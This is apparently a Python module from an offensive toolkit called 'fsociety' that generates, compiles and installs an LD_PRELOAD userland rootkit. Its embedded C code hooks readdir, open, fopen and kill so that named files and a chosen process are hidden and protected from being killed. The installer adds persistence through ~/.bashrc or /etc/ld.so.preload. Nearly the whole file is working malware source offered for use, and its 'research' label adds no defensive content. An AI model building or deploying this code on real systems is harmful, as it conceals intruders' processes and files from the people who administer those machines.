from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path

from fsociety.core.base import tool
from fsociety.core.logger import Log

PRELOAD_C = r'''
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdarg.h>
#include <errno.h>
#include <fcntl.h>

static const char *HIDE_NAME = "HIDE_PLACEHOLDER";
static const char *HIDE_PID  = "HIDE_PID_PLACEHOLDER";

static int match_hidden(const char *name) {
    if (HIDE_NAME[0] && strstr(name, HIDE_NAME)) return 1;
    return 0;
}

struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*real)(DIR *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;
    while ((entry = real(dirp)) != NULL) {
        if (match_hidden(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp) {
    static struct dirent64 *(*real)(DIR *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *entry;
    while ((entry = real(dirp)) != NULL) {
        if (match_hidden(entry->d_name)) continue;
        return entry;
    }
    return NULL;
}

int open(const char *path, int flags, ...) {
    static int (*real)(const char *, int, ...) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "open");
    if (HIDE_PID[0] && strstr(path, HIDE_PID)) {
        errno = ENOENT;
        return -1;
    }
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list ap; va_start(ap, flags);
        mode = va_arg(ap, mode_t); va_end(ap);
        return real(path, flags, mode);
    }
    return real(path, flags);
}

FILE *fopen(const char *path, const char *mode) {
    static FILE *(*real)(const char *, const char *) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "fopen");
    if (HIDE_PID[0] && strstr(path, HIDE_PID)) { errno = ENOENT; return NULL; }
    return real(path, mode);
}

int kill(pid_t pid, int sig) {
    static int (*real)(pid_t, int) = NULL;
    if (!real) real = dlsym(RTLD_NEXT, "kill");
    if (HIDE_PID[0] && pid == atoi(HIDE_PID)) return 0;
    return real(pid, sig);
}
'''

@tool("rootkit", "Userland hiding module: LD_PRELOAD builder and installer", category="research")
class Rootkit:
    @staticmethod
    def build_parser(p):
        sub = p.add_subparsers(dest="cmd", required=True)

        build = sub.add_parser("build", help="compile the preload library")
        build.add_argument("--name", required=True, help="substring to hide from directory listings")
        build.add_argument("--pid", default="", help="pid/string to hide from proc paths")
        build.add_argument("-o", "--out", required=True, help="output .so path")

        install = sub.add_parser("install", help="add library to user profile with LD_PRELOAD")
        install.add_argument("--lib", required=True, help="path to .so")
        install.add_argument("--scope", default="user", choices=["user", "system"])
        install.add_argument("--remove", action="store_true")

        inspect = sub.add_parser("inspect", help="verify the library exports")
        inspect.add_argument("lib")

        generate = sub.add_parser("generate", help="write the C source file only")
        generate.add_argument("--name", required=True)
        generate.add_argument("--pid", default="")
        generate.add_argument("-o", "--out", default="hide.c")

    @staticmethod
    def _write_source(path: Path, name: str, pid: str) -> Path:
        src = PRELOAD_C.replace("HIDE_PLACEHOLDER", name).replace("HIDE_PID_PLACEHOLDER", pid)
        path.write_text(src)
        return path

    @staticmethod
    def _compile(source: Path, out: Path) -> dict:
        try:
            out.parent.mkdir(parents=True, exist_ok=True)
            proc = subprocess.run(
                ["gcc", "-shared", "-fPIC", "-O2", "-Wall", "-o", str(out), str(source), "-ldl"],
                capture_output=True, text=True, timeout=60,
            )
        except (subprocess.SubprocessError, OSError) as exc:
            return {"ok": False, "error": str(exc)}
        return {"ok": proc.returncode == 0, "stderr": proc.stderr, "out": str(out)}

    @staticmethod
    def run(args, log: Log) -> int:
        if args.cmd == "generate":
            p = Rootkit._write_source(Path(args.out), args.name, args.pid)
            log.ok(f"wrote {p}")
            return 0

        if args.cmd == "build":
            src = Path("/tmp") / f"fsociety_hide_{os.getpid()}.c"
            Rootkit._write_source(src, args.name, args.pid)
            result = Rootkit._compile(src, Path(args.out))
            try:
                src.unlink()
            except OSError:
                pass
            if not result["ok"]:
                log.err(result.get("stderr") or result.get("error", ""))
                return 1
            log.ok(f"built {args.out}")
            return 0

        if args.cmd == "install":
            lib = Path(args.lib).resolve()
            if not lib.exists():
                log.err(f"missing {lib}")
                return 1
            if args.scope == "user":
                profile = Path.home() / ".bashrc"
                marker = "# fsociety preload"
                text = profile.read_text() if profile.exists() else ""
                if args.remove:
                    profile.write_text("\n".join(l for l in text.splitlines() if marker not in l and "LD_PRELOAD" not in l))
                    log.ok("profile cleaned")
                    return 0
                profile.write_text(text + f"\n{marker}\nexport LD_PRELOAD={lib}\n")
                log.ok(f"appended to {profile}")
                return 0
            if os.geteuid() != 0:
                log.err("system scope requires root")
                return 1
            target = Path("/etc/ld.so.preload")
            if args.remove:
                if target.exists():
                    kept = "\n".join(l for l in target.read_text().splitlines() if str(lib) not in l)
                    target.write_text(kept)
                log.ok("system preload cleaned")
                return 0
            existing = target.read_text() if target.exists() else ""
            target.write_text(existing + f"\n{lib}\n")
            log.ok(f"added to {target}")
            return 0

        if args.cmd == "inspect":
            try:
                proc = subprocess.run(["nm", "-D", args.lib],
                                      capture_output=True, text=True, timeout=15)
            except (subprocess.SubprocessError, OSError) as exc:
                log.err(str(exc))
                return 1
            symbols = [l for l in proc.stdout.splitlines() if " T " in l]
            for line in symbols:
                print(line)
            log.ok(f"{len(symbols)} export(s)")
            return 0

        return 2
